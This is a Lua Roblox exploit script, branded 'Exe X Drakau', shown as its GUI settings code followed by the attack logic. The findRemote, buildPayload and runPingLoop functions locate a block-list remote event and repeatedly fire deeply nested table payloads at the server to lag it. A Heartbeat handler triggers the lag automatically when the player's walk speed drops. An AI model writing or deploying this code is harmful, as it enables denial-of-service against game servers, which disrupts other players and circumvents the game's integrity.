powerBox.FocusLost:Connect(function()
    local n = tonumber(powerBox.Text)
    cfg.power1 = n and math.max(1, n) or DEFAULT_CFG.power1
    cfg.power = cfg.power1
    cfg.selectedPreset = nil
    if refreshPowerProfile then refreshPowerProfile() end
    saveConfig()
end)
delayBox1.FocusLost:Connect(function()
    local n = tonumber(delayBox1.Text)
    cfg.interval1 = n and math.max(0.001, n) or DEFAULT_CFG.interval1
    cfg.interval = cfg.interval1
    cfg.selectedPreset = nil
    if refreshPowerProfile then refreshPowerProfile() end
    saveConfig()
end)
local profileRow = Instance.new("Frame", powerPage)
profileRow.Name = "PowerProfileRow"
profileRow.Visible = false -- BACKUP removed
profileRow.Size = UDim2.new(1,0,0,25)
profileRow.Position = UDim2.new(0,0,0,60)
profileRow.BackgroundColor3 = rowBg0
profileRow.BackgroundTransparency = 0
profileRow.BorderSizePixel = 0
profileRow.ZIndex = 22
Instance.new("UICorner", profileRow).CornerRadius = UDim.new(0,5)
profileLabel = Instance.new("TextLabel", profileRow)
profileLabel.Size = UDim2.new(0,82,1,0)
profileLabel.Position = UDim2.new(0,8,0,0)
profileLabel.BackgroundTransparency = 1
profileLabel.Text = "USE"
profileLabel.TextColor3 = text0
profileLabel.Font = Enum.Font.GothamBold
profileLabel.TextSize = 9
profileLabel.TextXAlignment = Enum.TextXAlignment.Left
profileLabel.ZIndex = 23
local function profileButton(text, x)
    local b = Instance.new("TextButton", profileRow)
    b.Size = UDim2.new(0,56,0,18)
    b.Position = UDim2.new(0,x,0.5,-9)
    b.BackgroundColor3 = rowBoxBg0
    b.BorderSizePixel = 0
    b.Text = text
    b.TextColor3 = stroke0
    b.Font = Enum.Font.GothamBold
    b.TextSize = 8
    b.AutoButtonColor = false
    b.ZIndex = 24
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
    addStroke(b,1,0.3)
    return b
end
activePowerButton = profileButton("PRIMARY", 82)
backupPowerButton = profileButton("BACKUP", 142)

local function makePowerLed(button)
    local led = Instance.new("Frame", button)
    led.Name = "ActiveLed"
    led.Size = UDim2.new(0,6,0,6)
    led.Position = UDim2.new(0,3,0.5,-3)
    led.BackgroundColor3 = Color3.fromRGB(70,70,70)
    led.BorderSizePixel = 0
    led.ZIndex = 26
    Instance.new("UICorner", led).CornerRadius = UDim.new(1,0)
    return led
end
primaryLed = makePowerLed(activePowerButton)
backupLed = makePowerLed(backupPowerButton)
activePowerButton.MouseButton1Click:Connect(function()
    cfg.activePower = 1
    refreshPowerProfile()
    updateToggleButton()
    saveConfig()
end)
backupPowerButton.MouseButton1Click:Connect(function()
    cfg.activePower = 2
    refreshPowerProfile()
    updateToggleButton()
    saveConfig()
end)
refreshPowerProfile()

local autoBrainrotBtn, brainrotKnob
do
    local row = Instance.new("Frame", settingsPage)
    row.Size = UDim2.new(1,0,0,25)
    row.Position = UDim2.new(0,0,0,2)
    row.BackgroundColor3 = rowBg0
    row.BackgroundTransparency = 0
    row.BorderSizePixel = 0
    row.ZIndex = 22
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.6,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "AUTO BRAINROT"
    lbl.TextColor3 = text0
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextStrokeTransparency = 0.4
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 23
    autoBrainrotBtn = Instance.new("TextButton", row)
    autoBrainrotBtn.Size = UDim2.new(0,38,0,18)
    autoBrainrotBtn.Position = UDim2.new(1,-46,0.5,-9)
    autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and GREEN or TOGGLE_OFF
    autoBrainrotBtn.BorderSizePixel = 0
    autoBrainrotBtn.Text = ""
    autoBrainrotBtn.AutoButtonColor = false
    autoBrainrotBtn.ZIndex = 24
    Instance.new("UICorner", autoBrainrotBtn).CornerRadius = UDim.new(1, 0)
    brainrotKnob = Instance.new("Frame", autoBrainrotBtn)
    brainrotKnob.Size = UDim2.new(0,14,0,14)
    brainrotKnob.Position = cfg.autoBrainrot and UDim2.new(1,-16,0.5,-7) or UDim2.new(0,2,0.5,-7)
    brainrotKnob.BackgroundColor3 = TOGGLE_KNOB
    brainrotKnob.BorderSizePixel = 0
    brainrotKnob.ZIndex = 26
    Instance.new("UICorner", brainrotKnob).CornerRadius = UDim.new(1, 0)
    local knobStroke = Instance.new("UIStroke", brainrotKnob)
    knobStroke.Color = Color3.fromRGB(180,180,180)
    knobStroke.Thickness = 1; knobStroke.Transparency = 1
    autoBrainrotBtn.MouseButton1Click:Connect(function()
        cfg.autoBrainrot = not cfg.autoBrainrot
        if cfg.autoBrainrot then
            tw(autoBrainrotBtn, {BackgroundColor3 = GREEN}, 0.15)
            tw(brainrotKnob, {Position = UDim2.new(1,-16,0.5,-7)}, 0.15)
        else
            tw(autoBrainrotBtn, {BackgroundColor3 = TOGGLE_OFF}, 0.15)
            tw(brainrotKnob, {Position = UDim2.new(0,2,0.5,-7)}, 0.15)
            if active then flipLag(false, false) end
        end
        saveConfig()
    end)
end

local keybindKbRow, keybindGpRow
do
    local row = Instance.new("Frame", settingsPage)
    row.Size = UDim2.new(1,0,0,25)
    row.Position = UDim2.new(0,0,0,31)
    row.BackgroundColor3 = rowBg0
    row.BackgroundTransparency = 0
    row.BorderSizePixel = 0
    row.ZIndex = 22
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.4,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "KEYBOARD"
    lbl.TextColor3 = text0
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextStrokeTransparency = 0.4
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 23
    keybindKbRow = Instance.new("TextButton", row)
    keybindKbRow.Size = UDim2.new(0,84,0,18)
    keybindKbRow.Position = UDim2.new(1,-92,0.5,-9)
    keybindKbRow.BackgroundColor3 = rowBoxBg0
    keybindKbRow.BackgroundTransparency = 0
    keybindKbRow.BorderSizePixel = 0
    keybindKbRow.Text = cfg.keybindKb
    keybindKbRow.TextColor3 = stroke0
    keybindKbRow.Font = Enum.Font.GothamBold
    keybindKbRow.TextSize = 9
    keybindKbRow.ZIndex = 24
    Instance.new("UICorner", keybindKbRow).CornerRadius = UDim.new(0, 4)
    addStroke(keybindKbRow, 1, 0.3)
    keybindKbRow.MouseButton1Click:Connect(function()
        listeningFor = (listeningFor == "kb") and nil or "kb"
        keybindKbRow.Text = listeningFor == "kb" and "[?]" or cfg.keybindKb
    end)

    local row2 = Instance.new("Frame", settingsPage)
    row2.Size = UDim2.new(1,0,0,25)
    row2.Position = UDim2.new(0,0,0,60)
    row2.BackgroundColor3 = rowBg0
    row2.BackgroundTransparency = 0
    row2.BorderSizePixel = 0
    row2.ZIndex = 22
    Instance.new("UICorner", row2).CornerRadius = UDim.new(0, 5)
    local lbl2 = Instance.new("TextLabel", row2)
    lbl2.Size = UDim2.new(0.4,0,1,0)
    lbl2.Position = UDim2.new(0,8,0,0)
    lbl2.BackgroundTransparency = 1
    lbl2.Text = "CONTROLLER"
    lbl2.TextColor3 = text0
    lbl2.Font = Enum.Font.GothamBold
    lbl2.TextSize = 9
    lbl2.TextXAlignment = Enum.TextXAlignment.Left
    lbl2.ZIndex = 23
    keybindGpRow = Instance.new("TextButton", row2)
    keybindGpRow.Size = UDim2.new(0,84,0,18)
    keybindGpRow.Position = UDim2.new(1,-92,0.5,-9)
    keybindGpRow.BackgroundColor3 = rowBoxBg0
    keybindGpRow.BackgroundTransparency = 0
    keybindGpRow.BorderSizePixel = 0
    keybindGpRow.Text = cfg.keybindGp
    keybindGpRow.TextColor3 = stroke0
    keybindGpRow.Font = Enum.Font.GothamBold
    keybindGpRow.TextSize = 9
    keybindGpRow.ZIndex = 24
    Instance.new("UICorner", keybindGpRow).CornerRadius = UDim.new(0, 4)
    addStroke(keybindGpRow, 1, 0.3)
    keybindGpRow.MouseButton1Click:Connect(function()
        listeningFor = (listeningFor == "gp") and nil or "gp"
        keybindGpRow.Text = listeningFor == "gp" and "[?]" or cfg.keybindGp
    end)
end

local bgRow
do
    local row = Instance.new("Frame", configPage)
    row.Size = UDim2.new(1,0,0,25)
    row.Position = UDim2.new(0,0,0,89)
    row.BackgroundColor3 = rowBg0
    row.BackgroundTransparency = 0
    row.BorderSizePixel = 0
    row.ZIndex = 22
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.4,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "FONDO"
    lbl.TextColor3 = text0
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextStrokeTransparency = 0.4
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 23
    bgRow = Instance.new("TextButton", row)
    bgRow.Size = UDim2.new(0,58,0,18)
    bgRow.Position = UDim2.new(1,-80,0.5,-9)
    bgRow.BackgroundColor3 = rowBoxBg0
    bgRow.BackgroundTransparency = 0
    bgRow.BorderSizePixel = 0
    bgRow.Text = getBgName()
    bgRow.TextColor3 = stroke0
    bgRow.Font = Enum.Font.GothamBold
    bgRow.TextSize = 9
    bgRow.ZIndex = 24
    Instance.new("UICorner", bgRow).CornerRadius = UDim.new(0, 4)
    addStroke(bgRow, 1, 0.3)
    local function cycleBackground(delta)
        bgIndex = ((bgIndex - 1 + delta) % #BG_LIST) + 1
        local newId = getBgId()
        mainBgImage.Image = newId
        settingsBgImage.Image = newId
        bgRow.Text = getBgName()
        applyAccentColors()
        updateToggleButton()
    end
    local bgLeft = Instance.new("TextButton", row)
    bgLeft.Name = "backgroundArrowLeft"
    bgLeft.Size = UDim2.new(0,16,0,18)
    bgLeft.Position = UDim2.new(1,-101,0.5,-9)
    bgLeft.BackgroundColor3 = rowBoxBg0
    bgLeft.BorderSizePixel = 0
    bgLeft.Text = "<"
    bgLeft.TextColor3 = stroke0
    bgLeft.Font = Enum.Font.GothamBlack
    bgLeft.TextSize = 10
    bgLeft.AutoButtonColor = false
    bgLeft.ZIndex = 24
    Instance.new("UICorner", bgLeft).CornerRadius = UDim.new(1,0)
    addStroke(bgLeft, 1, 0.3)
    local bgRight = bgLeft:Clone()
    bgRight.Name = "backgroundArrowRight"
    bgRight.Position = UDim2.new(1,-20,0.5,-9)
    bgRight.Text = ">"
    bgRight.Parent = row
    bgLeft.MouseButton1Click:Connect(function() cycleBackground(-1) end)
    bgRight.MouseButton1Click:Connect(function() cycleBackground(1) end)
    bgRow.MouseButton1Click:Connect(function() cycleBackground(1) end)
end

local borderRow = Instance.new("Frame", configPage)
borderRow.Name = "BorderColorRow"
borderRow.Size = UDim2.new(1,0,0,25)
borderRow.Position = UDim2.new(0,0,0,118)
borderRow.BackgroundColor3 = rowBg0
borderRow.BackgroundTransparency = 0
borderRow.BorderSizePixel = 0
borderRow.ZIndex = 22
Instance.new("UICorner", borderRow).CornerRadius = UDim.new(0, 5)
local borderLbl = Instance.new("TextLabel", borderRow)
borderLbl.Size = UDim2.new(0,62,1,0)
borderLbl.Position = UDim2.new(0,8,0,0)
borderLbl.BackgroundTransparency = 1
borderLbl.Text = "BORDER"
borderLbl.TextColor3 = text0
borderLbl.Font = Enum.Font.GothamBold
borderLbl.TextSize = 9
borderLbl.TextXAlignment = Enum.TextXAlignment.Left
borderLbl.ZIndex = 23
local colorLeft = Instance.new("TextButton", borderRow)
colorLeft.Name = "colorArrowLeft"
colorLeft.Size = UDim2.new(0,16,0,18)
colorLeft.Position = UDim2.new(0,67,0.5,-9)
colorLeft.BackgroundColor3 = rowBoxBg0
colorLeft.BorderSizePixel = 0
colorLeft.Text = "<"
colorLeft.TextColor3 = stroke0
colorLeft.Font = Enum.Font.GothamBlack
colorLeft.TextSize = 10
colorLeft.AutoButtonColor = false
colorLeft.ZIndex = 24
Instance.new("UICorner", colorLeft).CornerRadius = UDim.new(1,0)
addStroke(colorLeft, 1, 0.3)
local colorRight = colorLeft:Clone()
colorRight.Name = "colorArrowRight"
colorRight.Position = UDim2.new(1,-23,0.5,-9)
colorRight.Text = ">"
colorRight.Parent = borderRow
local colorDots = Instance.new("Frame", borderRow)
colorDots.Name = "ColorDots"
colorDots.Size = UDim2.new(0,94,0,18)
colorDots.Position = UDim2.new(0,86,0.5,-9)
colorDots.ClipsDescendants = true
colorDots.BackgroundTransparency = 1
colorDots.ZIndex = 24
local colorDotLayout = Instance.new("UIListLayout", colorDots)
colorDotLayout.FillDirection = Enum.FillDirection.Horizontal
colorDotLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
colorDotLayout.VerticalAlignment = Enum.VerticalAlignment.Center
colorDotLayout.Padding = UDim.new(0,1)
local colorDotList = {}
local colorWindowStart = 1
local function updateColorDots()
    colorWindowStart = math.max(1, math.min(colorIndex - 3, #COLOR_OPTIONS - 6))
    for i, dot in ipairs(colorDotList) do
        local visible = i >= colorWindowStart and i < colorWindowStart + 7
        dot.Visible = visible
        local st = dot:FindFirstChild("DotStroke")
        if st then st.Thickness = (customStroke and i == colorIndex) and 2 or 1 end
        dot.BackgroundTransparency = (customStroke and i == colorIndex) and 0 or 0.15
    end
end
local function chooseBorderColor(index)
    colorIndex = ((index - 1) % #COLOR_OPTIONS) + 1
    customStroke = COLOR_OPTIONS[colorIndex]
    updateColorDots()
    applyAccentColors()
end
for i, color in ipairs(COLOR_OPTIONS) do
    local dot = Instance.new("TextButton", colorDots)
    dot.Name = "colorDot" .. i
    dot.Size = UDim2.new(0,10,0,10)
    dot.BackgroundColor3 = color
    dot.BorderSizePixel = 0
    dot.Text = ""
    dot.AutoButtonColor = false
    dot.ZIndex = 25
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)
    local ds = Instance.new("UIStroke", dot)
    ds.Name = "DotStroke"
    ds.Color = Color3.fromRGB(255,255,255)
    ds.Thickness = 1
    ds.Transparency = 1
    table.insert(colorDotList, dot)
    dot.MouseButton1Click:Connect(function() chooseBorderColor(i) end)
end
colorLeft.MouseButton1Click:Connect(function() chooseBorderColor(colorIndex - 1) end)
colorRight.MouseButton1Click:Connect(function() chooseBorderColor(colorIndex + 1) end)
updateColorDots()

local resetBtn = Instance.new("TextButton", configPage)
resetBtn.Size = UDim2.new(1,0,0,22)
resetBtn.Position = UDim2.new(0,0,0,148)
resetBtn.BackgroundColor3 = rowBg0
resetBtn.BackgroundTransparency = 0
resetBtn.BorderSizePixel = 0
resetBtn.AutoButtonColor = false
resetBtn.Text = "RESET DEFAULTS"
resetBtn.TextColor3 = text0
resetBtn.Font = Enum.Font.GothamBold
resetBtn.TextSize = 9
resetBtn.ZIndex = 22
Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 5)
local resetStroke = Instance.new("UIStroke", resetBtn)
resetStroke.Color = stroke0
resetStroke.Thickness = 1.2
resetStroke.Transparency = 0.3
addMovingOutline(resetStroke, 35)
resetBtn.MouseButton1Click:Connect(function()
    cfg.power1 = DEFAULT_CFG.power1
    cfg.power2 = DEFAULT_CFG.power2
    cfg.interval1 = DEFAULT_CFG.interval1
    cfg.interval2 = DEFAULT_CFG.interval2
    cfg.activePower = DEFAULT_CFG.activePower
    cfg.power = cfg.power1
    cfg.interval = cfg.interval1
    cfg.keybindKb = DEFAULT_CFG.keybindKb
    cfg.keybindGp = DEFAULT_CFG.keybindGp
    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
    customStroke = nil
    colorIndex = 1
    updateColorDots()
    refreshPowerProfile()
    keybindKbRow.Text = cfg.keybindKb
    keybindGpRow.Text = cfg.keybindGp
    if autoBrainrotBtn then
        autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and GREEN or TOGGLE_OFF
        brainrotKnob.Position = cfg.autoBrainrot and UDim2.new(1,-16,0.5,-7) or UDim2.new(0,2,0.5,-7)
    end
    saveConfig()
end)

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local found = nil
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
            found = r
            break
        end
    end
    if not found then
        for _, c in ipairs(rrs:GetChildren()) do
            if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent") or c:IsA("RemoteFunction")) and c.Name:find("Block") then
                found = c
                break
            end
        end
    end
    return found
end

remote = findRemote()

local function buildPayload(power)
    local safePower = tonumber(power) or DEFAULT_CFG.power
    if safePower < 1 then safePower = 1 end
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(safePower / 188), 10000)
    if maxRep < 1 then maxRep = 1 end
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    if not active or not remote then
        pingLoopRunning = false
        return
    end
    pingLoopRunning = true
    local currentDelay = tonumber(cfg.interval) or DEFAULT_CFG.interval
    while active and remote and pingLoopRunning do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(payload)
            else
                remote:FireServer(payload)
            end
        end)
        if not ok then
            currentDelay = math.min(currentDelay * 1.5, 0.5)
        else
            currentDelay = math.max(currentDelay * 0.995, 0.05)
        end
        task.wait(currentDelay)
    end
    pingLoopRunning = false
end

local function flipLag(state, isManual)
    if not state and pingLoopRunning then
        pingLoopRunning = false
    end
    active = state
    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end
    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                updateToggleButton()
                return
            end
        end
        updateToggleButton()
        task.spawn(runPingLoop)
    else
        updateToggleButton()
    end
end

applyAccentColors = function()
    local accent = getAccent()
    local textColor = getText()
    local strokeColor = getStroke()
    local accentDim = accent:Lerp(Color3.new(0,0,0), 0.4)
    local rowBg = Color3.new(accent.R*0.35, accent.G*0.35, accent.B*0.35)
    local rowBoxBg = Color3.new(accent.R*0.15, accent.G*0.15, accent.B*0.15)
    local tabAct = Color3.new(accent.R*0.3, accent.G*0.3, accent.B*0.3)
    local tabInact = Color3.new(accent.R*0.1, accent.G*0.1, accent.B*0.1)

    mainStroke.Color = strokeColor
    ss.Color = strokeColor
    aStroke.Color = strokeColor
    resetStroke.Color = strokeColor

    local function walk(obj)
        if not obj then return end
        local skipSelf = (obj.Name:find("^colorDot") ~= nil or obj.Name == "statusPill" or obj.Name == "statusLbl" or obj.Name == "autoBrainrotBtn" or obj.Name == "brainrotKnob")
        local skipParent = (obj.Parent == statusPill or obj.Parent == autoBrainrotBtn)
        if not skipSelf and not skipParent then
            if obj:IsA("TextLabel") then
                if obj == titleLbl then
                    obj.TextColor3 = strokeColor
                    obj.TextStrokeColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.55)
                elseif obj == setTitle then
                    obj.TextColor3 = strokeColor
                    obj.TextStrokeColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.6)
                else
                    obj.TextColor3 = textColor
                end
            elseif obj:IsA("TextButton") then
                if obj == activateBtn then
                    obj.BackgroundColor3 = rowBg
                    obj.TextColor3 = textColor
                elseif obj == tabPower then
                    if powerPage.Visible then
                        obj.BackgroundColor3 = tabAct
                        obj.TextColor3 = strokeColor
                    else
                        obj.BackgroundColor3 = tabInact
                        obj.TextColor3 = textColor
                    end
                elseif obj == tabSettings then
                    if settingsPage.Visible then
                        obj.BackgroundColor3 = tabAct
                        obj.TextColor3 = strokeColor
                    else
                        obj.BackgroundColor3 = tabInact
                        obj.TextColor3 = textColor
                    end
                elseif false then -- tabConfig removed
                    if configPage.Visible then
                        obj.BackgroundColor3 = tabAct
                        obj.TextColor3 = strokeColor
                    else
                        obj.BackgroundColor3 = tabInact
                        obj.TextColor3 = textColor
                    end
                elseif obj == resetBtn then
                    obj.BackgroundColor3 = rowBg
                    obj.TextColor3 = textColor
                elseif obj == keybindKbRow or obj == keybindGpRow or obj == bgRow or obj == setCloseBtn then
                    obj.BackgroundColor3 = rowBoxBg
                    obj.TextColor3 = strokeColor
                elseif obj == lockBtn then
                    obj.BackgroundColor3 = uiLocked and LOCK_RED or UNLOCK_GREEN
                    obj.TextColor3 = Color3.fromRGB(255,255,255)
                else
                    obj.BackgroundColor3 = rowBg
                    obj.TextColor3 = textColor
                end
            elseif obj:IsA("TextBox") then
                obj.BackgroundColor3 = rowBoxBg
                obj.TextColor3 = strokeColor
            elseif obj:IsA("Frame") then
                if obj == mainFrame or obj == settingsFrame or obj == darkOverlay or obj == settingsOverlay then
                    obj.BackgroundColor3 = Color3.fromRGB(0,0,0)
                elseif obj == header or obj == setHeader or obj == btnContainer or obj == tabBar or obj == pagesFrame or obj == powerPage or obj == settingsPage  or obj == mainContent or obj == profileRow then
                else
                    obj.BackgroundColor3 = rowBg
                end
            end
            for _, st in ipairs(obj:GetChildren()) do
                if st:IsA("UIStroke") then
                    st.Color = strokeColor
                end
            end
        end
        for _, child in ipairs(obj:GetChildren()) do
            walk(child)
        end
    end
    walk(screen)
    if activePowerButton and backupPowerButton then refreshPowerProfile() end
    if not active then
        ag.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, accentDim),
            ColorSequenceKeypoint.new(1, accent)
        })
    end
end

activateBtn.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)

statusPill.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)

-- lock/bg kept for compatibility (hidden)
pcall(function()
    if lockBtn and lockBtn.MouseButton1Click then
        lockBtn.MouseButton1Click:Connect(function()
            uiLocked = not uiLocked
        end)
    end
end)
pcall(function()
    if bgBtn and bgBtn.MouseButton1Click then
        bgBtn.MouseButton1Click:Connect(function()
            bgIndex = (bgIndex % #BG_LIST) + 1
            local newId = getBgId()
            mainBgImage.Image = newId
            if settingsBgImage then settingsBgImage.Image = newId end
            pcall(saveConfig)
        end)
    end
end)

gearBtn.MouseButton1Click:Connect(function()
    settingsFrame.Visible = not settingsFrame.Visible
end)

RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
            if active then flipLag(false, false) end
        end
        return
    end
    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local currentSpeed = hum.WalkSpeed
    if currentSpeed < 25 then
        if not lastBrainrotState then
            brainrotMode = true
            lastBrainrotState = true
            manualOverride = false
            if not active then flipLag(true, false) end
        end
    else
        if lastBrainrotState then
            brainrotMode = false
            lastBrainrotState = false
            manualOverride = false
            if active then flipLag(false, false) end
        end
    end
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    local kc = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
    local isGp = isGamepadKeyCode(kc)

    if listeningFor then
        local newKey = nil
        if isKb then newKey = kc
        elseif isGp then newKey = kc end
        if newKey and not BLACKLISTED[kc] then
            if listeningFor == "gp" then
                cfg.keybindGp = newKey.Name
                keybindGpRow.Text = newKey.Name
            else
                cfg.keybindKb = newKey.Name
                keybindKbRow.Text = newKey.Name
            end
            listeningFor = nil
            saveConfig()
        end
        return
    end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        if not mainFrame.Visible then settingsFrame.Visible = false end
        return
    end

    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)
    if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

tabPower.MouseButton1Click:Connect(function()
    selectTab("power")
    applyAccentColors()
end)

tabSettings.MouseButton1Click:Connect(function()
    selectTab("settings")
    applyAccentColors()
end)

if tonumber(savedUi.bgIndex) then
    bgIndex = math.max(1, math.min(math.floor(savedUi.bgIndex), #BG_LIST))
    local restoredId = getBgId()
    mainBgImage.Image = restoredId
    settingsBgImage.Image = restoredId
    if bgRow then bgRow.Text = getBgName() end
end
if tonumber(savedUi.colorIndex) then colorIndex = math.max(1, math.min(math.floor(savedUi.colorIndex), #COLOR_OPTIONS)) end
if type(savedUi.customStroke) == "table" then
    customStroke = Color3.new(tonumber(savedUi.customStroke[1]) or 1, tonumber(savedUi.customStroke[2]) or 1, tonumber(savedUi.customStroke[3]) or 1)
end
if updateColorDots then updateColorDots() end




active = false
pingLoopRunning = false
brainrotMode = false
lastBrainrotState = false
updateToggleButton()
selectTab("power")


applyAccentColors()

-- Restore saved power/interval into UI + preset highlight
task.defer(function()
    cfg.power = cfg.power1
    cfg.interval = cfg.interval1
    if powerBox then powerBox.Text = tostring(cfg.power1 or 100000) end
    if delayBox1 then delayBox1.Text = tostring(cfg.interval1 or 0.13) end
    if cfg.selectedPreset == "LOW" then
        if setPresetVisual then setPresetVisual(mainLowBtn) end
    elseif cfg.selectedPreset == "MED" then
        if setPresetVisual then setPresetVisual(mainMedBtn) end
    elseif cfg.selectedPreset == "HIGH" then
        if setPresetVisual then setPresetVisual(mainHighBtn) end
    end
    -- Force OFF on execute
    active = false
    pingLoopRunning = false
    brainrotMode = false
    lastBrainrotState = false
    if updateToggleButton then updateToggleButton() end
    print("[EXE] UI restored power=" .. tostring(cfg.power1) .. " delay=" .. tostring(cfg.interval1) .. " | started OFF")
end)

-- ===== Overhead tag =====
local function addOverheadTag(char)
    local head = char:WaitForChild("Head", 10)
    if not head then return end
    local old = head:FindFirstChild("ExeDrakauTag")
    if old then old:Destroy() end
    local bb = Instance.new("BillboardGui")
    bb.Name = "ExeDrakauTag"
    bb.Size = UDim2.new(0, 90, 0, 18)
    bb.StudsOffset = Vector3.new(0, 2.4, 0)
    bb.AlwaysOnTop = true
    bb.Adornee = head
    bb.Parent = head
    local t = Instance.new("TextLabel", bb)
    t.Size = UDim2.new(1, 0, 1, 0)
    t.BackgroundTransparency = 1
    t.Text = "Exe X Drakau"
    t.TextColor3 = Color3.fromRGB(255, 255, 255)
    t.TextStrokeTransparency = 0
    t.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    t.Font = Enum.Font.GothamBold
    t.TextSize = 12
end
if plr.Character then task.spawn(addOverheadTag, plr.Character) end
plr.CharacterAdded:Connect(addOverheadTag)
